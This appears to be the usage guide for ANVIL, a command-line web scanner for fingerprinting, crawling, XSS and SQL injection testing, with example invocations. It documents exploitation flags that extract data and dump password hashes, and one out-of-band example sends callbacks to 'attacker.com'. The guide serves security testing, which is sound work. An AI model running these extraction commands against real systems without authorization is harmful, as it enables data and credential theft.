# ANVIL Usage Guide

Complete reference for ANVIL command-line options and usage patterns.

## Table of Contents

- [Basic Usage](#basic-usage)
- [Target Specification](#target-specification)
- [Scan Modules](#scan-modules)
- [SQL Injection Options](#sql-injection-options)
- [Authentication](#authentication)
- [Direct Testing Mode](#direct-testing-mode)
- [Exploitation Modes](#exploitation-modes)
- [Performance Tuning](#performance-tuning)
- [Output Options](#output-options)
- [Examples](#examples)

---

## Basic Usage

```bash
anvil --target <URL> [OPTIONS]
```

The `--target` (`-t`) flag is required and specifies the target URL to scan.

---

## Target Specification

| Option | Description |
|--------|-------------|
| `--target <URL>` | Target URL (required). Include protocol (http/https). |

**Examples:**
```bash
anvil --target https://example.com
anvil --target http://192.168.1.100:8080/app/
anvil --target "https://example.com/page.php?id=1"
```

---

## Scan Modules

| Option | Description |
|--------|-------------|
| `--all` | Enable ALL scan modules |
| `--fingerprint` | Server/OS/framework fingerprinting |
| `--crawl` | Application crawling & parameter discovery |
| `--xss` | Cross-Site Scripting detection |

**Examples:**
```bash
# Full scan with all modules
anvil --target https://example.com --all

# Only fingerprinting
anvil --target https://example.com --fingerprint

# Crawl and discover parameters
anvil --target https://example.com --crawl
```

---

## SQL Injection Options

### Detection Techniques

| Option | Description |
|--------|-------------|
| `--sqli` | Boolean/Error-based SQLi detection |
| `--time-sqli` | Time-based (blind) SQLi detection |
| `--stacked` | Stacked queries detection |
| `--oob` | Out-of-band SQLi (requires callback) |
| `--second-order` | Second-order SQLi detection |
| `--sqli-all` | Enable ALL SQLi techniques |

### SQLi Configuration

| Option | Description |
|--------|-------------|
| `--oob-callback <DOMAIN>` | Callback domain for OOB detection |
| `--time-samples <N>` | Samples per time-based test (default: 6) |
| `--time-delay <SEC>` | Delay for time-based payloads (default: 2) |

**Examples:**
```bash
# Boolean/Error-based detection
anvil --target https://example.com --sqli

# Time-based blind SQLi
anvil --target https://example.com --time-sqli

# All SQLi techniques
anvil --target https://example.com --sqli-all

# OOB detection with callback
anvil --target https://example.com --oob --oob-callback attacker.com
```

---

## Authentication

| Option | Description |
|--------|-------------|
| `--cookie <STRING>` | Cookie header for authenticated scanning |
| `--header <STRING>` | Custom HTTP header (can use multiple times) |

**Cookie Format:**
```
"name1=value1; name2=value2"
```

**Examples:**
```bash
# Session cookie authentication
anvil --target https://example.com --cookie "PHPSESSID=abc123"

# Multiple cookies
anvil --target https://example.com --cookie "session=xyz; user=admin"

# Bearer token authentication
anvil --target https://api.example.com --header "Authorization: Bearer token123"

# Multiple custom headers
anvil --target https://example.com \
      --header "X-API-Key: secret" \
      --header "X-Custom: value"
```

---

## Direct Testing Mode

Skip crawling and test specific parameters directly.

| Option | Description |
|--------|-------------|
| `--param <NAME>` | Parameter name to test |
| `--method <METHOD>` | HTTP method: GET or POST (default: GET) |
| `--data <STRING>` | POST body data |
| `--trigger-url <URL>` | Trigger URL for second-order SQLi |
| `--extra-data <STRING>` | Extra data to include with payloads |

**Examples:**
```bash
# Test specific GET parameter
anvil --target "https://example.com/page.php" --param id --sqli

# Test POST parameter
anvil --target https://example.com/login --param username --method POST --sqli

# Include extra POST data
anvil --target https://example.com/search --param q --method POST \
      --extra-data "Submit=Search" --sqli

# Second-order SQLi (inject on one page, trigger on another)
anvil --target https://example.com/profile/update \
      --trigger-url https://example.com/profile/view \
      --param bio --sqli
```

---

## Exploitation Modes

**⚠️ WARNING: Use exploitation modes only on systems you own or have explicit permission to test.**

| Option | Description |
|--------|-------------|
| `--proof` | Safe metadata extraction (DB version, user, etc.) |
| `--exploit` | Data extraction (DANGEROUS) |
| `--dump-hashes` | Extract password hashes |

**Examples:**
```bash
# Safe proof-of-concept (metadata only)
anvil --target https://example.com --sqli --proof

# Full exploitation (extracts data)
anvil --target https://example.com --sqli --exploit

# Extract database hashes
anvil --target https://example.com --sqli --dump-hashes
```

---

## Performance Tuning

| Option | Description | Default |
|--------|-------------|---------|
| `--rate <N>` | Max requests per second | 5 |
| `--depth <N>` | Crawl depth limit | 2 |
| `--time-samples <N>` | Time-based SQLi samples | 6 |
| `--time-delay <SEC>` | Time-based delay (seconds) | 2 |

**Examples:**
```bash
# Aggressive scanning (higher rate)
anvil --target https://example.com --rate 20 --all

# Deep crawling
anvil --target https://example.com --depth 5 --crawl

# Precise time-based detection
anvil --target https://example.com --time-sqli --time-samples 10 --time-delay 3
```

---

## Output Options

| Option | Description |
|--------|-------------|
| `--no-banner` | Hide the ASCII banner |
| `--quiet` | Minimal output |
| `--verbose` | Debug-level output |
| `--format <FMT>` | Output format: text, json, csv |
| `--output <FILE>` | Save results to file |

**Examples:**
```bash
# Quiet mode for scripts
anvil --target https://example.com --all --quiet

# JSON output to file
anvil --target https://example.com --all --format json --output results.json

# Verbose debugging
anvil --target https://example.com --sqli --verbose
```

---

## Examples

### Basic Reconnaissance
```bash
# Fingerprint and crawl
anvil --target https://example.com --fingerprint --crawl
```

### SQL Injection Testing
```bash
# Quick SQLi test on known parameter
anvil --target "https://example.com/product.php" --param id --sqli

# Comprehensive SQLi scan with authentication
anvil --target https://example.com \
      --cookie "session=abc123" \
      --sqli-all \
      --verbose
```

### POST-Based Testing
```bash
# Login form testing
anvil --target https://example.com/login \
      --param username \
      --method POST \
      --extra-data "password=test&submit=Login" \
      --sqli
```

### Second-Order SQLi
```bash
# Profile update scenario
anvil --target https://example.com/profile/edit \
      --trigger-url https://example.com/admin/users \
      --param bio \
      --method POST \
      --cookie "admin_session=xyz" \
      --sqli
```

### Authenticated API Testing
```bash
anvil --target https://api.example.com/v1/users \
      --header "Authorization: Bearer eyJhbGc..." \
      --header "Content-Type: application/json" \
      --param user_id \
      --sqli
```

---

## See Also

- [SQL-INJECTION.md](SQL-INJECTION.md) - SQLi detection techniques
- [architecture.md](architecture.md) - System architecture
- [roadmap.md](roadmap.md) - Feature roadmap

